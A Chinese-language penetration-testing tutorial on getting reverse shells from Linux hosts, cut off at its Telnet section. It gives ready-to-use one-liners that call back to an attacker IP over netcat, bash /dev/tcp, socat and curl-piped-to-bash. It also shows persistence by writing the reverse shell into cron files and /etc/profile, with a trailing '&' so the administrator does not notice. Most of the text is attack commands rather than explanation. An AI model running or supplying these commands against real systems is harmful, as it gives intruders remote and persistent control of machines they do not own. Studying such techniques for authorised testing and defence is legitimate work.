## 前言
在渗透测试实战中，我们经常会遇到Linux系统环境，而让Linux主机反弹个shell是再常见不过的事情了。
反弹shell，就是攻击机监听在某个TCP/UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。
### 正向连接
假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。
### 反向连接
那么为什么要用反弹shell呢？
反弹shell通常适用于如下几种情况：
  * 目标机因防火墙受限，目标机器只能发送请求，不能接收请求。
  * 目标机端口被占用。
  * 目标机位于局域网，或IP会动态变化，攻击机无法直接连接。
  * 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。
  * ......
对于以上几种情况，我们是无法利用正向连接的，要用反向连接。
那么反向连接就很好理解了，就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。
反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。
## 利用netcat反弹shell
Netcat 是一款简单的Unix工具，使用UDP和TCP协议。 它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。
使用它你可以轻易的建立任何连接。
目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数
-e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：
    wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz
    tar -xvzf netcat-0.7.1.tar.gz
    ./configure
    make && make install
    make clean
安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。
**攻击机开启本地监听：**
    netcat -lvvp 2333
**目标机主动连接攻击机：**
    netcat 47.xxx.xxx.72 2333 -e /bin/bash
    # nc   -e /bin/bash
执行效果如下：
## 利用Bash反弹shell
个人感觉反弹shell最好用的方法就是使用bash结合重定向方法的一句话，具体命令如下：
    bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
    或
    bash -c "bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1"
    # bash -i >& /dev/tcp/攻击机IP/攻击机端口 0>&1
> 以下是针对Bash反弹一句话进行了拆分说明：
>
> 命令 | 命令详解  
> ---|---  
> bash -i | 产生一个bash交互环境。  
> >& | 将联合符号前面的内容与后面相结合，然后一起重定向给后者。  
> /dev/tcp/47.xxx.xxx.72/2333 |
> Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。  
> 0>&1 | 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。  
>  
> Bash反弹一句完整的解读过程就是：
>
> Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP
> 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。
**攻击机开启本地监听：**
    nc -lvvp 2333
**目标机主动连接攻击机：**
    bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
执行效果如下：
### Curl配合Bash反弹shell
这里操作也很简单，借助了Linux中的管道。
首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：
    bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
并开启2333端口的监听。
然后再目标机上执行如下，即可反弹shell：
    curl 47.xxx.xxx.72|bash
执行效果如下：
根据curl命令和Linux管道的作用，你不难理解这其中的原理。
Curl配合Bash反弹shell的方式在CTF题目中经常出现，`curl IP|bash`
中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。
### 将反弹shell的命令写入定时任务
我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在
`/var/spool/cron/[crontabs]/` 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。
比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos系列主机)
比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu系列主机)
    */1  *  *  *  *   /bin/bash -i>&/dev/tcp/47.xxx.xxx.72/2333 0>&1
    #每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell
### 将反弹shell的命令写入/etc/profile文件
将以下反弹shell的命写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。
    /bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 &
    # 最后面那个&为的是防止管理员无法输入命令
当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell：
## 利用Socat反弹shell
Socat是Linux 下一个多功能的网络工具，名字来由是”Socket
CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参见这里：
安装Socat的方法很简单：
  * Ubuntu等可以直接使用 `apt-get install socat` 命令进行安装
  * 也可以去官网下载源码包：
**攻击机开启本地监听：**
    socat TCP-LISTEN:2333 -    或
    nc -lvvp 2333
**目标机主动连接攻击机：**
    socat tcp-connect:47.xxx.xxx.72:2333 exec:'bash -li',pty,stderr,setsid,sigint,sane
执行效果如下：
## 利用Telnet反弹shell
当nc和/dev/tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以使用Telnet反弹shell。
### 方法一
**攻击机开启本地监听：**